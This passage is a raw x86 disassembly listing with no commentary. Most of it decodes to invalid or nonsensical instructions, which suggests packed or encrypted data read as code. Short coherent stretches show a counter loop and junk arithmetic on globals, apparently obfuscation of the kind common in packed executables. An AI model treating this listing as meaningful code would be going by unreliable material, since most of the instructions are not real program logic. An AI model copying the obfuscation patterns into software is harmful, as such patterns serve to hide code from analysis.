  40725d:	jb     0x40723d
  40725f:	xchg   ebx,eax
  407260:	(bad)  
  407261:	adc    eax,0x6cfc77ca
  407266:	rep outs dx,BYTE PTR ds:[esi]
  407268:	scas   al,BYTE PTR es:[edi]
  407269:	retf   
  40726a:	call   0x5ece7d53
  40726f:	pop    ecx
  407270:	xor    al,0x1a
  407272:	dec    edx
  407273:	hlt    
  407274:	jge    0x4072d5
  407276:	xor    ebp,DWORD PTR [ebp-0x4d]
  407279:	xchg   esi,eax
  40727a:	jo     0x40725f
  40727c:	xor    BYTE PTR [edi+0x3396f4f],bh
  407282:	int3   
  407283:	mov    BYTE PTR [esi+0x6],0xa
  407287:	cs (bad) 
  407289:	neg    DWORD PTR [esi+0x5e033cdf]
  40728f:	dec    edi
  407290:	xchg   edx,eax
  407291:	imul   eax,DWORD PTR [edx+0x2f43666f],0xffffff82
  407298:	scas   eax,DWORD PTR es:[edi]
  407299:	mov    al,0xd4
  40729b:	mov    dh,0x17
  40729d:	push   ecx
  40729e:	popa   
  40729f:	test   BYTE PTR es:[ecx+0x497627b5],dl
  4072a6:	jo     0x407239
  4072a8:	mov    edx,0x64d77627
  4072ad:	push   ebx
  4072ae:	aam    0x2b
  4072b0:	leave  
  4072b1:	int    0x53
  4072b3:	lahf   
  4072b4:	out    0xb1,eax
  4072b6:	xor    ch,BYTE PTR [edi]
  4072b8:	fdiv   QWORD PTR [ebx]
  4072ba:	or     bl,cl
  4072bc:	jmp    0x4072dd
  4072be:	pop    ss
  4072bf:	jns    0x407259
  4072c1:	fnsave [edi+ecx*8]
  4072c4:	out    dx,eax
  4072c5:	lahf   
  4072c6:	mov    esp,0x20d7d924
  4072cb:	lea    esp,[esi-0x56be9ccb]
  4072d1:	sbb    eax,0x907ce5bc
  4072d6:	and    al,0xb6
  4072d8:	jp     0x407282
  4072da:	push   ds
  4072db:	push   es
  4072dc:	xor    DWORD PTR [esi],ebp
  4072de:	scas   al,BYTE PTR es:[edi]
  4072df:	call   0x5c1b2d88
  4072e4:	cwde   
  4072e5:	adc    dh,BYTE PTR [ebp+0x65]
  4072e8:	add    BYTE PTR [esp+ebx*4-0x74113ff1],0xbb
  4072f0:	sbb    DWORD PTR [edi+0x70069d2],ecx
  4072f6:	jae    0x407304
  4072f8:	and    esi,DWORD PTR [ecx+0x43c85d73]
  4072fe:	pop    ebx
  4072ff:	cwde   
  407300:	push   0xffffffb0
  407302:	jnp    0x4072b9
  407304:	mov    al,0x20
  407306:	cmp    BYTE PTR [edx],bh
  407308:	inc    edx
  407309:	jg     0x40737e
  40730b:	lea    ebx,[eax+0x10]
  40730e:	arpl   WORD PTR [ecx-0x71c5f8d7],ax
  407314:	pop    edx
  407315:	and    al,0xb8
  407317:	or     al,0xe1
  407319:	and    al,0xac
  40731b:	lds    edi,FWORD PTR [edx+0x32bb69f8]
  407321:	(bad)  
  407322:	and    al,BYTE PTR [ebp-0x29]
  407325:	in     al,dx
  407326:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  407328:	cmc    
  407329:	mov    bl,0xc9
  40732b:	gs (bad) 
  40732d:	cld    
  40732e:	push   ss
  40732f:	jl     0x40732f
  407331:	jb     0x40735e
  407333:	add    edx,DWORD PTR [ebx-0x14]
  407336:	add    bl,ah
  407338:	ins    BYTE PTR es:[edi],dx
  407339:	mov    ebp,0x70a937e1
  40733e:	int3   
  40733f:	mov    dl,0xd2
  407341:	jne    0x40737c
  407343:	ss (bad) 
  407345:	dec    DWORD PTR [ecx-0x7e0bba75]
  40734b:	add    eax,0x42fcd1
  407350:	add    esp,edi
  407352:	inc    edx
  407353:	add    BYTE PTR [ebx],dh
  407355:	mov    BYTE PTR [ecx+0x42fcfd05],0x0
  40735c:	not    BYTE PTR [edi+0x0]
  40735f:	add    BYTE PTR [ebx],al
  407361:	mov    DWORD PTR [ecx+0x42e70f35],0x2a1100
  40736b:	add    BYTE PTR [ecx+0x45c7e845],cl
  407371:	in     al,0x3c
  407373:	test   DWORD PTR [eax+edi*8+0x67ff45c6],ebx
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	mov    al,ds:0xf71c5d02
  407400:	iret   
  407401:	jo     0x407473
  407403:	and    BYTE PTR [ebp+0x70],bh
  407406:	jo     0x407450
  407408:	jo     0x40746d
  40740a:	and    ebx,DWORD PTR [edi+0x530e567c]
  407410:	adc    BYTE PTR [esi+0x576aae9b],cl
  407416:	mov    ch,0xc2
  407418:	loopne 0x407480
  40741a:	xchg   edx,eax
  40741b:	scas   al,BYTE PTR es:[edi]
  40741c:	test   BYTE PTR [eax],al
  40741e:	and    esi,DWORD PTR [ecx-0xd805c04]
  407424:	ss jmp 0x4073c4
  407427:	addr16 sub al,0xe2
  40742a:	sbb    eax,0x81d26701
  40742f:	ja     0x407455
  407431:	jno    0x40743b
  407433:	push   ds
  407434:	jbe    0x4073d0
  407436:	xor    eax,0x2c5f62e9
  40743b:	outs   dx,BYTE PTR ds:[esi]
  40743c:	je     0x4073e5
  40743e:	(bad)  
  40743f:	cmc    
  407440:	adc    ch,dl
  407442:	jne    0x4073ff
  407444:	test   DWORD PTR [ecx],edi
  407446:	dec    ecx
  407447:	dec    eax
  407448:	pop    esp
  407449:	adc    BYTE PTR [ebx+ebp*8-0x79],ch
  40744d:	mul    BYTE PTR [eax]
  40744f:	lock add BYTE PTR [ebp+eiz*4+0x5],bl
  407454:	mov    ?,WORD PTR [edi]
  407456:	stc    
  407457:	fst    QWORD PTR [ebx]
  407459:	adc    edi,esp
  40745b:	push   ds
  40745c:	int3   
  40745d:	pushf  
  40745e:	(bad)
  407462:	sbb    ch,BYTE PTR [edi+ebx*8-0x4912a2c]
  407469:	xlat   BYTE PTR ds:[ebx]
  40746a:	out    0xc8,eax
  40746c:	call   0xf69cd669
  407471:	or     DWORD PTR [eax],0x5623f32b
  407477:	push   ebp
  407478:	mov    al,0x51
  40747a:	xchg   esi,eax
  40747b:	ins    DWORD PTR es:[edi],dx
  40747c:	mov    dl,0xb5
  40747e:	test   al,0xb4
  407480:	xchg   edi,eax
  407481:	scas   al,BYTE PTR es:[edi]
  407482:	push   0xde622771
  407487:	inc    esp
  407488:	aad    0xe6
  40748a:	inc    esi
  40748b:	icebp  
  40748c:	test   eax,0x308856f2
  407491:	mov    esp,0x1cbc72cc
  407496:	dec    ecx
  407497:	fdiv   DWORD PTR [ecx+0x50cf1792]
  40749d:	xchg   ebx,eax
  40749e:	dec    esp
  40749f:	cld    
  4074a0:	and    DWORD PTR [esi+0x6e],ecx
  4074a3:	(bad)  
  4074a5:	xlat   BYTE PTR ds:[ebx]
  4074a6:	mov    eax,ds:0x4e20eef8
  4074ab:	sbb    esi,DWORD PTR [edx]
  4074ad:	fst    DWORD PTR [ebx]
  4074af:	test   edx,esi
  4074b1:	mov    ebp,0x42c49871
  4074b6:	cs jmp 0x339a:0x8a4e67b2
  4074be:	cwde   
  4074bf:	sbb    eax,0x36c52d3b
  4074c4:	ret    
  4074c5:	push   edi
  4074c6:	and    al,0x8c
  4074c8:	sahf   
  4074c9:	int    0xac
  4074cb:	into   
  4074cc:	mov    dh,0x87
  4074ce:	das    
  4074cf:	mov    dl,0x8c
  4074d1:	in     eax,0x29
  4074d3:	pop    ecx
  4074d4:	repz retf 
  4074d6:	adc    esi,DWORD PTR [edx]
  4074d8:	mov    bl,0xeb
  4074da:	mov    bl,0xa6
  4074dc:	test   ch,al
  4074de:	adc    esi,DWORD PTR [edx]
  4074e0:	test   al,0x5e
  4074e2:	pop    es
  4074e3:	xchg   esp,eax
  4074e4:	or     BYTE PTR [ecx+0x66],cl
  4074e7:	inc    ebp
  4074e8:	outs   dx,BYTE PTR ds:[esi]
  4074e9:	and    eax,DWORD PTR [ecx-0x71]
  4074ec:	sub    dh,ch
  4074ee:	jmp    0xeed290b6
  4074f3:	jp     0x4074a6
  4074f5:	aam    0xe7
  4074f7:	xor    al,0x2d
  4074f9:	push   cs
  4074fa:	fcmovne st,st(2)
  4074fc:	or     BYTE PTR [edx*2+0x74cecb5a],0x98
  407504:	lea    edi,[esp+edx*2]
  407507:	xor    DWORD PTR [edx+0x3c],esi
  40750a:	and    eax,0x79316c3a
  40750f:	and    BYTE PTR [ebx+0x1976eb59],bl
  407515:	(bad)  
  407516:	imul   esi,edx,0x6a1804ce
  40751c:	and    bl,BYTE PTR [esi-0x18]
  40751f:	pop    esi
  407520:	sti    
  407521:	pop    ebp
  407522:	in     al,0x9e
  407524:	push   eax
  407525:	int3   
  407526:	out    dx,al
  407527:	dec    edi
  407528:	int3   
  407529:	jb     0x407548
  40752b:	mov    al,0x59
  40752d:	jns    0x40759b
  40752f:	and    eax,0xa9fcee21
  407534:	cld    
  407535:	test   DWORD PTR [ebp+0x80fd44e],0x9c68d9ff
  40753f:	jb     0x4074c3
  407541:	or     BYTE PTR [esi-0x2fd80e56],dl
  407547:	cdq    
  407548:	stc    
  407549:	cwde   
  40754a:	push   0xd479f998
  40754f:	inc    ebp
  407550:	dec    ebx
  407551:	ja     0x407515
  407553:	sub    eax,DWORD PTR [edx+0x60]
  407556:	xchg   ebp,eax
  407557:	jne    0x407556
  407559:	loop   0x4075d9
  40755b:	add    BYTE PTR [edi-0x5f],bh
  40755e:	cmp    eax,0x4fb3634d
  407563:	jg     0x407566
  407565:	cmp    BYTE PTR [ebx+0x7db554cd],ch
  40756b:	xor    esi,esi
  40756d:	and    ebp,esi
  40756f:	inc    edx
  407570:	jecxz  0x4075b7
  407572:	daa    
  407573:	and    eax,0x552245b4
  407578:	das    
  407579:	add    BYTE PTR [esp+esi*8],ah
  40757c:	jns    0x407527
  40757e:	add    DWORD PTR [ebx+0x1c],ebx
  407581:	or     al,al
  407583:	adc    eax,0xd8a49812
  407588:	jge    0x407582
  40758a:	sbb    DWORD PTR [edx-0x4a],ebx
  40758d:	mul    BYTE PTR [ebp-0x43]
  407590:	ret    0xc60
  407593:	xlat   BYTE PTR ds:[ebx]
  407594:	inc    edx
  407595:	xchg   esp,eax
  407596:	sub    eax,0x54d1a31d
  40759b:	repz sub eax,0x5434b1e0
  4075a1:	dec    edi
  4075a2:	dec    esi
  4075a3:	push   eax
  4075a4:	push   ds
  4075a5:	pop    ds
  4075a6:	push   ebp
  4075a7:	cmp    ebp,DWORD PTR [ebx+0x58]
  4075aa:	xchg   edx,eax
  4075ab:	xchg   edx,eax
  4075ac:	jbe    0x40761f
  4075ae:	mov    eax,0xda839b6d
  4075b3:	mov    eax,ds:0x82726d3e
  4075b8:	int    0x39
  4075ba:	loopne 0x4075ac
  4075bc:	add    bh,ah
  4075be:	mov    WORD PTR [edi+0x13],?
  4075c1:	icebp  
  4075c2:	cli    
  4075c3:	xchg   esp,eax
  4075c4:	inc    ebx
  4075c5:	pop    ecx
  4075c6:	jno    0x40763c
  4075c8:	or     DWORD PTR ss:[esi+0x37],eax
  4075cc:	hlt    
  4075cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075ce:	dec    ecx
  4075cf:	pusha  
  4075d0:	and    ch,BYTE PTR ds:0xfcea05e4
  4075d6:	inc    esp
  4075d7:	push   esp
  4075d8:	mov    bl,0x9f
  4075da:	mov    ecx,0x7aff164b
  4075df:	ja     0x407658
  4075e1:	adc    DWORD PTR [eax-0x5f],esp
  4075e4:	xchg   esi,eax
  4075e5:	imul   eax,DWORD PTR [ecx-0x813c7e7],0x4c
  4075ec:	stc    
  4075ed:	mov    ah,BYTE PTR [edx+esi*2-0x4e6b136b]
  4075f4:	in     eax,dx
  4075f5:	sub    cl,BYTE PTR [eax]
  4075f7:	retf   
  4075f8:	jne    0x407619
  4075fa:	push   cs
  4075fb:	pop    edi
  4075fc:	jg     0x40765e
  4075fe:	and    bh,al
  407600:	push   edi
  407601:	(bad)  
  407602:	jae    0x4075f7
  407604:	and    BYTE PTR [ebp-0x4c],dl
  407607:	(bad)  
  407608:	cmp    dh,BYTE PTR [eax+0x68]
  40760b:	xor    eax,0xe634051f
  407610:	ret    0x7040
  407613:	imul   ecx,DWORD PTR [eax],0x39ee4229
  407619:	cmp    al,0x2e
  40761b:	ja     0x4075cb
  40761d:	bound  esp,QWORD PTR [ebx+0x2730fd40]
  407623:	imul   esi,DWORD PTR [esi],0xc7f6cce6
  407629:	jae    0x407681
  40762b:	jmp    0x40768c
  40762d:	push   edi
  40762e:	ret    
  40762f:	in     eax,0xbb
  407631:	xchg   esi,eax
  407632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407633:	popa   
  407634:	rcr    BYTE PTR ds:0xa64b4504,cl
  40763a:	test   DWORD PTR [ebp-0x748924fd],edi
  407640:	pusha  
  407641:	scas   eax,DWORD PTR es:[edi]
  407642:	ficom  DWORD PTR [ecx+0x30]
  407645:	popa   
  407646:	arpl   WORD PTR [edi+0x47d4b450],dx
  40764c:	mov    ds,WORD PTR [eax-0x60f1a6b]
  407652:	cmp    cl,ch
  407654:	adc    DWORD PTR [esp+edx*4],ebp
  407657:	xchg   edi,eax
  407658:	mov    bh,0x99
  40765a:	push   ss
  40765b:	data16 add dl,al
  40765e:	mov    edi,0x13f188af
  407663:	jge    0x4075f1
  407665:	aas    
  407666:	pop    edx
  407667:	jmp    0x4076cd
  407669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40766a:	inc    ebx
  40766b:	mov    dh,BYTE PTR gs:[ebp-0x5f]
  40766f:	or     edx,ecx
  407671:	xor    esp,DWORD PTR [esi+edx*2-0x14cf31b6]
  407678:	into   
  407679:	imul   ebp,DWORD PTR [ebx+0x49d0cc8f],0x33
  407680:	lods   al,BYTE PTR ds:[esi]
  407681:	jae    0x407659
  407683:	leave  
  407684:	rcr    BYTE PTR [ebp-0x3e],cl
  407687:	push   es
  407688:	test   al,0x98
  40768a:	call   0x2964c91f
  40768f:	fisttp WORD PTR [eax+0x373a38be]
  407695:	push   esp
  407696:	inc    esi
  407697:	or     DWORD PTR [esi],ecx
  407699:	add    ah,bl
  40769b:	jbe    0x407647
  40769d:	push   ds
  40769e:	leave  
  40769f:	in     al,0xcc
  4076a1:	(bad)
  4076a4:	(bad)  
  4076a5:	adc    bl,BYTE PTR ss:[edi-0x1cf8ef07]
  4076ac:	popa   
  4076ad:	jae    0x40767b
  4076af:	daa    
  4076b0:	inc    ebp
  4076b1:	fstp   st(0)
  4076b3:	test   ebp,eax
  4076b5:	fs popf 
  4076b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076b8:	aam    0xbd
  4076ba:	mov    ah,al
  4076bc:	scas   al,BYTE PTR es:[edi]
  4076bd:	imul   edx,DWORD PTR [ecx],0xf3fcf531
  4076c3:	push   0x280580bf
  4076c8:	test   DWORD PTR ds:0x1197aeab,esi
  4076ce:	inc    esp
  4076cf:	jns    0x4076e9
  4076d1:	sbb    BYTE PTR [edx+0x40],ch
  4076d4:	retf   0x5379
  4076d7:	sub    ebp,esi
  4076d9:	pop    edx
  4076da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076db:	push   ss
  4076dc:	repz pop ebx
  4076de:	jge    0x407688
  4076e0:	ss scas eax,DWORD PTR es:[edi]
  4076e2:	cwde   
  4076e3:	or     DWORD PTR [edx],0xffffffe0
  4076e6:	push   ecx
  4076e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076e8:	fsub   st,st(4)
  4076ea:	dec    edx
  4076eb:	jle    0x407711
  4076ed:	cmp    edi,DWORD PTR [esi]
  4076ef:	daa    
  4076f0:	ret    0xd517
  4076f3:	add    al,0xa7
  4076f5:	mov    dl,0x7
  4076f7:	sub    eax,0xac7961c0
  4076fc:	(bad)  [edx]
  4076fe:	loop   0x407715
  407700:	lahf   
  407701:	mov    ecx,0x62fc8919
  407706:	int3   
  407707:	arpl   WORD PTR [edx],si
  407709:	loop   0x4076c3
  40770b:	pop    es
  40770c:	xor    eax,0x488f0a2b
  407711:	mov    ch,0xc0
  407713:	aad    0x8c
  407715:	(bad)
  407718:	add    BYTE PTR [edx],bl
  40771a:	or     eax,0xea5b517
  40771f:	mov    dl,0x9e
  407721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407722:	xor    BYTE PTR ds:0xc1ed464b,0x8a
  407729:	sbb    eax,0x3528b509
  40772e:	rcr    BYTE PTR [edi],0x28
  407731:	imul   eax,DWORD PTR [ebp+0x40a4d286],0xffffff8b
  407738:	inc    ebp
  407739:	fdiv   QWORD PTR [ebx]
  40773b:	mov    BYTE PTR [ebx],0xc7
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	div    BYTE PTR [esi+ebx*2]
  4077dc:	adc    DWORD PTR [edi+0x207070cc],esp
  4077e2:	jge    0x407854
  4077e4:	jo     0x407855
  4077e6:	sub    al,BYTE PTR [eax-0x7b62e032]
  4077ec:	rol    DWORD PTR [eax+0x1c],0xfd
  4077f0:	cdq    
  4077f1:	fisubr WORD PTR [eax+edi*1+0x19cb3f3a]
  4077f8:	rol    DWORD PTR [esi-0x6fd56c32],1
  4077fe:	dec    ecx
  4077ff:	mov    eax,ds:0xf728b614
  407804:	and    edi,DWORD PTR ds:0xffebe609
  40780a:	retf   
  40780b:	cld    
  40780c:	call   DWORD PTR [ebp-0x76]
  40780f:	add    DWORD PTR ds:[ebx+edx*4+0x7d],edi
  407814:	inc    ebx
  407815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407816:	and    eax,eax
  407818:	adc    esi,esp
  40781a:	test   BYTE PTR [eax-0x57],al
  40781d:	xor    DWORD PTR [esi],0x480b4a32
  407823:	jecxz  0x4077d6
  407825:	xor    edx,DWORD PTR [ebp+0x45]
  407828:	pusha  
  407829:	mov    WORD PTR [ecx-0x683a1eed],fs
  40782f:	lods   al,BYTE PTR ds:[esi]
  407830:	xlat   BYTE PTR ds:[ebx]
  407831:	inc    ebp
  407832:	jbe    0x4077c8
  407834:	cli    
  407835:	add    BYTE PTR [eax+0x780d48d4],ah
  40783b:	lods   eax,DWORD PTR ds:[esi]
  40783c:	and    BYTE PTR [edi-0x2cd0b13d],dl
  407842:	mov    eax,ds:0xc86bf78e
  407847:	mov    cl,0xf6
  407849:	loopne 0x40780f
  40784b:	loopne 0x4077db
  40784d:	add    bh,BYTE PTR [eax+0x7b]
  407850:	test   ebp,0xb2123981
  407856:	and    eax,0xb16c025f
  40785b:	into   
  40785c:	cli    
  40785d:	retf   0x9420
  407860:	or     ecx,DWORD PTR [esi]
  407862:	mov    ecx,0x9128ef77
  407867:	or     DWORD PTR [eax-0x55e3dde1],esi
  40786d:	out    0x3b,eax
  40786f:	dec    esp
  407870:	(bad)  
  407871:	mov    cl,0x5d
  407873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407874:	and    DWORD PTR [ebp-0x22],ebx
  407877:	enter  0xcc18,0xc5
  40787b:	sub    ah,BYTE PTR [esi-0x32]
  40787e:	or     al,0x23
  407880:	(bad)  [ebx]
  407882:	popf   
  407883:	push   ebp
  407884:	or     bh,BYTE PTR [edx]
  407886:	sbb    eax,0x35b47bb3
  40788b:	xchg   BYTE PTR [esi-0x7f],ah
  40788e:	push   ss
  40788f:	imul   esi,DWORD PTR [esi],0x5e8cbd42
  407895:	or     DWORD PTR [ebx+eax*8-0x7f8caf4e],ecx
  40789c:	(bad)  
  40789d:	or     al,0xc0
  40789f:	lahf   
  4078a0:	shl    BYTE PTR [edx],0x56
  4078a3:	ficomp DWORD PTR [eax+0x40fb08c0]
  4078a9:	test   BYTE PTR [edx+0x32],dh
  4078ac:	sub    ebx,DWORD PTR [ebx+0x3a]
  4078af:	add    DWORD PTR [ecx+0x67],esi
  4078b2:	ins    DWORD PTR es:[edi],dx
  4078b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078b4:	clc    
  4078b5:	jge    0x407843
  4078b7:	push   eax
  4078b8:	jmp    0x8b3b3671
  4078bd:	adc    ecx,DWORD PTR [edi+0x1cf6efbd]
  4078c3:	push   ebx
  4078c4:	xchg   ebx,eax
  4078c5:	jne    0x4078ef
  4078c7:	jae    0x40788b
  4078c9:	jno    0x4078a8
  4078cb:	retf   0xc662
  4078ce:	dec    ecx
  4078cf:	fnstcw WORD PTR [edx]
  4078d1:	push   es
  4078d2:	(bad)  
  4078d3:	mov    eax,0xc6481561
  4078d8:	push   ecx
  4078d9:	test   DWORD PTR [eax],edx
  4078db:	mov    ?,ebx
  4078dd:	inc    ebx
  4078de:	or     al,0x1e
  4078e0:	shl    DWORD PTR [edx+edi*8],1
  4078e3:	cmp    eax,0xba9a3467
  4078e8:	push   edi
  4078e9:	mov    esi,0x7e6ccff1
  4078ee:	into   
  4078ef:	sbb    al,0x97
  4078f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078f2:	int    0x96
  4078f4:	in     eax,dx
  4078f5:	add    edx,DWORD PTR [eax+0x7b]
  4078f8:	ror    BYTE PTR [edi],0x7f
  4078fb:	cmc    
  4078fc:	fcomp  QWORD PTR [ebx+ebx*4+0x7169b740]
  407903:	pop    es
  407904:	push   ebx
  407905:	fisttp DWORD PTR [ebx-0x5d]
  407908:	loopne 0x407915
  40790a:	rol    ah,0x63
  40790d:	cli    
  40790e:	cld    
  40790f:	(bad)  
  407910:	jle    0x407951
  407912:	stos   DWORD PTR es:[edi],eax
  407913:	sub    al,0xce
  407915:	lods   eax,DWORD PTR ds:[esi]
  407916:	inc    ebx
  407917:	pop    ss
  407918:	ds ret 
  40791a:	mov    bl,0xc6
  40791c:	in     eax,0xac
  40791e:	mov    DWORD PTR [edx],ebx
  407920:	xor    eax,0x528b69f1
  407925:	and    al,0x8e
  407927:	ins    BYTE PTR es:[edi],dx
  407928:	push   0xffffffc5
  40792a:	mov    esi,0x59ab8cbb
  40792f:	sub    DWORD PTR [eax],ebp
  407931:	(bad)  
  407933:	xchg   ecx,eax
  407934:	push   edi
  407935:	stc    
  407936:	fld    QWORD PTR [ebp+0x3ea68bea]
  40793c:	sub    ch,bh
  40793e:	enter  0x2873,0x4d
  407942:	mov    eax,ds:0x4a39449e
  407947:	add    al,0xb4
  407949:	push   0xc137f066
  40794e:	cdq    
  40794f:	push   eax
  407950:	mov    edx,0x14e51602
  407955:	pop    es
  407956:	gs mov cl,0xae
  407959:	sti    
  40795a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40795b:	fmulp  st(4),st
  40795d:	mov    ebx,0x2c4dab81
  407962:	xchg   edi,eax
  407963:	and    al,0x8
  407965:	test   al,0xa1
  407967:	mov    al,0x21
  407969:	push   edi
  40796a:	in     al,0xf4
  40796c:	inc    edx
  40796d:	add    DWORD PTR [eax],0x43129ce9
  407973:	mov    cl,0xdc
  407975:	sub    al,0x5
  407977:	mov    edi,0x75219363
  40797c:	into   
  40797d:	xchg   ecx,eax
  40797e:	pop    ecx
  40797f:	pop    ds
  407980:	retf   0x4067
  407983:	xchg   ebx,eax
  407984:	jno    0x4079fb
  407986:	xchg   esi,eax
  407987:	ins    DWORD PTR es:[edi],dx
  407988:	imul   esp,DWORD PTR [edi],0x5b516f75
  40798e:	loop   0x4079c7
  407990:	adc    eax,0xc277420f
  407995:	(bad)  
  407996:	lods   al,BYTE PTR ds:[esi]
  407997:	(bad)  
  407998:	push   ebp
  407999:	mov    cs,WORD PTR gs:[esi-0xe]
  40799d:	ins    DWORD PTR es:[edi],dx
  40799e:	push   0x17
  4079a0:	add    al,0x12
  4079a2:	popa   
  4079a3:	mov    bh,0x5a
  4079a5:	push   0x15
  4079a7:	vpsrlq xmm1,xmm5,XMMWORD PTR [esp+ebp*2]
  4079ac:	fs icebp 
  4079ae:	ja     0x407a02
  4079b0:	jne    0x4079eb
  4079b2:	ror    BYTE PTR [edi],cl
  4079b4:	xchg   ecx,eax
  4079b5:	imul   ax,WORD PTR [esi-0x46162a28],0xffe2
  4079bd:	mov    bh,0x3c
  4079bf:	add    ecx,DWORD PTR [esp+eax*4-0x23]
  4079c3:	cwde   
  4079c4:	push   0x4dccc1b8
  4079c9:	mov    WORD PTR [edi-0x7aaa5615],?
  4079cf:	jns    0x4079ea
  4079d1:	lock and BYTE PTR [eax],al
  4079d4:	add    bh,BYTE PTR [edx]
  4079d6:	push   esi
  4079d7:	aad    0x6a
  4079d9:	sub    esi,0x8
  4079dc:	push   ebx
  4079dd:	push   esi
  4079de:	jbe    0x407962
  4079e0:	scas   eax,DWORD PTR es:[edi]
  4079e1:	jb     0x4079fe
  4079e3:	cmc    
  4079e4:	aam    0x9f
  4079e6:	lods   al,BYTE PTR ds:[esi]
  4079e7:	xchg   esi,eax
  4079e8:	sub    bh,ah
  4079ea:	or     DWORD PTR [ecx+0x20],eax
  4079ed:	pop    edi
  4079ee:	jecxz  0x407a1d
  4079f0:	(bad)
  4079f3:	sbb    BYTE PTR [edx+0x70],bh
  4079f6:	sbb    ah,BYTE PTR [ebx]
  4079f8:	sahf   
  4079f9:	pop    edx
  4079fa:	cdq    
  4079fb:	mov    ds:0xa49d234f,al
  407a00:	nop
  407a01:	mov    cl,0x58
  407a03:	add    esp,DWORD PTR [ecx-0x32]
  407a06:	push   es
  407a07:	jnp    0x407a1e
  407a09:	adc    al,0x34
  407a0b:	jp     0x407a6b
  407a0d:	bound  esi,QWORD PTR [eax-0x7b35ead6]
  407a13:	jbe    0x407a69
  407a15:	xlat   BYTE PTR ds:[ebx]
  407a16:	mov    esi,0x96df9975
  407a1b:	sar    ah,cl
  407a1d:	mov    esi,0xdb31c0be
  407a22:	imul   ebp,eax,0xc45b51dc
  407a28:	xchg   esi,eax
  407a29:	adc    BYTE PTR [ebp+0x3b],0x86
  407a2d:	cmp    eax,0x47855295
  407a32:	mov    al,ds:0x37122843
  407a37:	adc    eax,0xcec8439c
  407a3c:	js     0x407a20
  407a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a3f:	jl     0x407a54
  407a41:	icebp  
  407a42:	sub    al,BYTE PTR [edx+eax*2]
  407a45:	pop    edx
  407a46:	call   0xbe2f7701
  407a4b:	inc    esp
  407a4c:	mov    bh,0x2f
  407a4e:	push   eax
  407a4f:	sahf   
  407a50:	loope  0x407a03
  407a52:	xchg   edx,eax
  407a53:	inc    eax
  407a54:	adc    al,0x29
  407a56:	mov    dl,0xa2
  407a58:	outs   dx,DWORD PTR ds:[esi]
  407a59:	pop    es
  407a5a:	(bad)  [edx-0x3d]
  407a5d:	mov    eax,0x64cd818
  407a62:	out    dx,eax
  407a63:	ja     0x407a56
  407a65:	test   BYTE PTR [ebp+0x635ccde3],0xcd
  407a6c:	push   0xffffffe5
  407a6e:	loope  0x407a3d
  407a70:	dec    edx
  407a71:	inc    esi
  407a72:	loop   0x407ac2
  407a74:	push   DWORD PTR [ecx-0x13622859]
  407a7a:	mov    esi,0x248a063
  407a7f:	inc    ecx
  407a80:	cs jge 0x407a3d
  407a83:	popa   
  407a84:	pop    edx
  407a85:	inc    esi
  407a86:	in     al,0x3a
